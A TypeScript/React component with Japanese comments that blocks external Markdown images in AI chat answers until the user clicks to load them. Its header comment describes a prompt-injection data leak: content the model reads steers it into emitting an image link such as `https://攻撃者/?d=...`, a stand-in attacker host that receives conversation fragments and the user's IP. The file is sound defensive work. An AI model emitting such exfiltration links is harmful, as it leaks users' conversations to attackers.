// AI チャットの Markdown 画像。
//
// LLM の回答は取り込んだページやノートの指示に影響され得る。`![](https://攻撃者/?d=...)` を
// そのまま <img> にすると、回答が描かれた瞬間に会話の断片と IP が外へ出る。
// 外部（http / https / プロトコル相対）の画像は自動で読み込まず、ホストを見せた枠にして、
// 押したときだけ読み込む。data: / blob: / アプリ内の素材参照は従来どおり。

import { ImageOff } from "lucide-react";
import { useState } from "react";
import { t } from "../../i18n";
import { isLocalMediaRef } from "../asset-browser/local-media-ref";

/**
 * 自動で読み込んでよい画像かどうか（許可リスト）。
 * data:image/ ・blob:・アプリ内の素材参照（local-media:// など）だけ true。
 * それ以外はすべて外部扱い。相対パスも含める（/api/url/image-proxy?url=... は sidecar が
 * 攻撃者の URL を取りに行く経路になるため）。
 */
export function isAutoLoadableImageSrc(src: string): boolean {
  return isLocalMediaRef(src);
}

/** 自動では読み込まない（枠に出す）画像か。 */
export function isExternalImageSrc(src: string): boolean {
  return !isAutoLoadableImageSrc(src);
}

/**
 * 枠に出すホスト名。パスとクエリは出さない（計測用のトークンが載るため）。
 * image-proxy 経由（?url=...）は中身の URL のホストを出す。
 */
export function externalImageHost(src: string): string {
  try {
    const u = new URL(src.trim(), "https://placeholder.invalid");
    const inner = u.searchParams.get("url");
    if (u.pathname.startsWith("/api/") && inner) {
      return new URL(inner).hostname;
    }
    return u.hostname === "placeholder.invalid" ? "" : u.hostname;
  } catch {
    return "";
  }
}

// 枠は remote-content の placeholder（DOM を組み立てる・ノート単位の許可を押す形）を流用せず、
// React のボタンで持つ。チャットの回答は 1 枚ずつ許可でき、ノートの同意状態とは無関係なため。

// 利用者が「読み込む」を押した URL をセッションの間だけ覚える（永続化しない）。
// 再描画や新しいメッセージでコンポーネントが再マウントされても、枠に戻さないため。
const loadedImageSrcs = new Set<string>();

/** 押した URL を覚える（テストからも使う） */
export function rememberLoadedImage(src: string): void {
  loadedImageSrcs.add(src);
}

/** 押して読み込み済みの URL か */
export function isRememberedImage(src: string): boolean {
  return loadedImageSrcs.has(src);
}

export function GatedMarkdownImage({ src, alt }: { src?: string; alt?: string }) {
  const [loadedNow, setLoaded] = useState(false);
  const loaded = loadedNow || (!!src && loadedImageSrcs.has(src));
  if (!src) return null;
  if (!isExternalImageSrc(src) || loaded) {
    return (
      <img
        src={src}
        alt={alt ?? ""}
        referrerPolicy="no-referrer"
        loading="lazy"
        className="max-w-full rounded"
      />
    );
  }
  const host = externalImageHost(src);
  return (
    <button
      type="button"
      onClick={() => {
        rememberLoadedImage(src);
        setLoaded(true);
      }}
      data-remote-image-blocked=""
      className="my-1.5 flex w-full items-center gap-2 rounded-md border border-dashed border-border bg-card px-3 py-2 text-left hover:bg-muted"
    >
      <ImageOff size={16} className="shrink-0 text-muted-foreground" />
      <span className="flex min-w-0 flex-1 flex-col">
        <span className="truncate text-xs font-medium text-foreground">
          {host ? t("ai.chat.remoteImage.title", { host }) : t("ai.chat.remoteImage.titleNoHost")}
        </span>
        <span className="text-xs text-muted-foreground">{t("ai.chat.remoteImage.why")}</span>
      </span>
      <span className="shrink-0 rounded border border-border px-2 py-1 text-xs font-medium">
        {t("ai.chat.remoteImage.action")}
      </span>
    </button>
  );
}

/** テスト用: 覚えた URL を空にする */
export function resetLoadedImagesForTest(): void {
  loadedImageSrcs.clear();
}
